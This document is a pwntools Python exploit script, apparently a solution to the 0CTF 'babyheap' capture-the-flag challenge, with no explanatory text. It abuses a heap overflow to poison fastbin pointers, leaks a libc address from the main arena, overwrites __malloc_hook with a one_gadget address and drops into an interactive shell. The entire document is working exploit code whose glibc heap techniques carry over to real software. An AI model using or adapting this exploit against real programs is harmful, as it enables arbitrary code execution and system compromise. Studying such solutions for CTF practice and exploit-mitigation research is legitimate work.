from pwn import *

def alloc(size):
    r.sendline('1')
    r.sendlineafter(': ', str(size))
    r.recvuntil(': ')

def fill(idx, data):
    r.sendline('2')
    r.sendlineafter(': ', str(idx))
    r.sendlineafter(': ', str(len(data)))
    r.sendlineafter(': ', data)
    r.recvuntil(': ')

def free(idx):
    r.sendline('3')
    r.sendlineafter(': ', str(idx))
    r.recvuntil(': ')

def dump(idx):
    r.sendline('4')
    r.sendlineafter(':', str(idx))
    r.recvuntil(': \n')
    data = r.recvline()
    r.recvuntil(': ')
    return data

libc = ELF('./libc.so.6')
r = process('./0ctfbabyheap')

r.recvuntil(':')

alloc(0x10) # 0x00
alloc(0x10) # 0x20
alloc(0x10) # 0x40
alloc(0x10) # 0x60
alloc(0x80) # 0x80

free(2)
free(1)

# modify fd value
payload  = p64(0) * 3
payload += p64(0x21)
payload += p8(0x80)
fill(0, payload)

# modify size (for fastbins)
payload  = p64(0) * 3
payload += p64(0x21) # fastbins
fill(3, payload)

alloc(0x10)
alloc(0x10)

# restore size
payload  = p64(0) * 3
payload += p64(0x91)
fill(3, payload)

alloc(0x80)
free(4)

leak = u64(dump(2)[:8])

main_arena = leak - 0x58
libc.address = main_arena - 0x3c4b20

log.info('libc address : ' + hex(libc.address))
log.info('__malloc_hook : ' + hex(libc.symbols['__malloc_hook']))
log.info('chunk : ' + hex(libc.symbols['__malloc_hook'] - 0x23))


alloc(0x60)
free(4)

fill(2, p64(libc.symbols['__malloc_hook'] - 0x23)) # fd

alloc(0x60) # 5
alloc(0x60) # 6

payload  = '\x00' * 3
payload += p64(0) * 2
payload += p64(libc.address + 0x4526a) # one_shot
fill(6, payload)

alloc(1)

r.interactive()
